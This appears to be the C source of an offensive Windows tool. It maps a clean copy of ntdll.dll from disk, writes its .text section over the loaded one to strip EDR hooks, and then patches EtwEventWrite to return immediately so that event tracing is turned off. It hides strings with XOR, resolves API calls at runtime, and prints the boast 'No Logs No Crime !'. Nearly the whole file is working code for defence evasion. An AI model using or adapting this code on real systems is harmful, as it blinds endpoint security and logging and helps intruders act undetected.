#include <winternl.h>
#include <windows.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment (lib, "advapi32")
#pragma comment(lib, "mscoree.lib")

#include "Common.h"
#include "Structs.h"


#pragma comment (lib, "advapi32")
#pragma comment(lib, "mscoree.lib")

BOOL UnhookNTDLL(const HMODULE hNtdll, const LPVOID pMapping) {
/*
    UnhookNtdll() finds .text segment of fresh loaded copy of ntdll.dll and copies over the hooked one
*/
    DWORD oldprotect = 0;
    PIMAGE_DOS_HEADER pidh = (PIMAGE_DOS_HEADER)pMapping;
    PIMAGE_NT_HEADERS pinh = (PIMAGE_NT_HEADERS)((DWORD_PTR)pMapping + pidh->e_lfanew);
    int i;


    // find .text section
    for (i = 0; i < pinh->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER pish = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pinh) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

        if (!strcmp((char*)pish->Name, ".text")) {
            // prepare ntdll.dll memory region for write permissions.

            VirtualProtect_p((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pish->VirtualAddress), pish->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldprotect);
            if (!oldprotect) {
                // RWX failed!
                return -1;
            }
            // copy original .text section into ntdll memory
            memcpy((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pish->VirtualAddress), (LPVOID)((DWORD_PTR)pMapping + (DWORD_PTR)pish->VirtualAddress), pish->Misc.VirtualSize);

            // restore original protection settings of ntdll
            VirtualProtect_p((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pish->VirtualAddress), pish->Misc.VirtualSize, oldprotect, &oldprotect);
            if (!oldprotect) {
                // it failed
                return -1;
            }
            return 0;
        }
    }
    return -1;
}

BOOL FuckEtw() {

    DWORD oldprotect = 0;

    void* pEventWrite = GetProcAddress(GetModuleHandleA("ntdll.dll"), (LPCSTR)sEtwEventWrite);

	if (!VirtualProtect_p(pEventWrite, 4096, PAGE_EXECUTE_READWRITE, &oldprotect)) {
		printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

#ifdef _WIN64
    memcpy(pEventWrite, "\x48\x33\xc0\xc3", 4); 		// xor rax, rax; ret
#else
    memcpy(pEventWrite, "\x33\xc0\xc2\x14\x00", 5);		// xor eax, eax; ret 14
#endif

	if (!VirtualProtect_p(pEventWrite, 4096, oldprotect, &oldprotect)) {
		printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	if (!FlushInstructionCache(GetCurrentProcess(), pEventWrite, 4096)) {
		printf("[!] FlushInstructionCache Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

    return TRUE;

}


int main() {

	Banner();

	int ret = 0;
	HANDLE hFile;

	HANDLE hFileMapping;
	LPVOID pMapping;

	// Resolve the function pointers
	CreateFileMappingA_t CreateFileMappingA_p = (CreateFileMappingA_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sCreateFileMappingA);
	MapViewOfFile_t MapViewOfFile_p = (MapViewOfFile_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sMapViewOfFile);

	UnmapViewOfFile_t UnmapViewOfFile_p = (UnmapViewOfFile_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sUnmapViewOfFile);
	VirtualProtect_p = (VirtualProtect_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sVirtualProtect);
	//
	
	printf("\n[i] Hooked Ntdll Base Address : 0x%p \n", pLocalNtdll);
	// open ntdll.dll
	XORcrypt((char*)sNtdllPath, sNtdllPath_len, sNtdllPath[sNtdllPath_len - 1]);
	hFile = CreateFileA((LPCSTR)sNtdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		// failed to open ntdll.dll
		return -1;
	}

	// prepare file mapping
	hFileMapping = CreateFileMappingA_p(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
	if (!hFileMapping) {
		// file mapping failed

		CloseHandle(hFile);
		return -1;
	}

	// map the bastard
	pMapping = MapViewOfFile_p(hFileMapping, FILE_MAP_READ, 0, 0, 0);
	if (!pMapping) {
		// mapping failed
		CloseHandle(hFileMapping);
		CloseHandle(hFile);
		return -1;
	}

	// remove hooks
	ret = UnhookNTDLL(GetModuleHandleA((LPCSTR)sNtdllPath), pMapping);

	printf("[i] Unhooked Ntdll Base Address: 0x%p \n", sNtdll);

	// Clean up.
	UnmapViewOfFile_p(pMapping);
	CloseHandle(hFileMapping);
	CloseHandle(hFile);

	printf("\n[+] PID Of The Current Proccess: [%d]\n", GetCurrentProcessId());
	printf("\n[#] Ready For ETW Patch.\n");

	printf("[+] Press <Enter> To Patch ETW ...\n"); getchar();

	if (!FuckEtw()) 
		return EXIT_FAILURE;
	
		printf("\n[+] ETW Patched, No Logs No Crime ! \n");
		printf("\n");

	return 0;
}
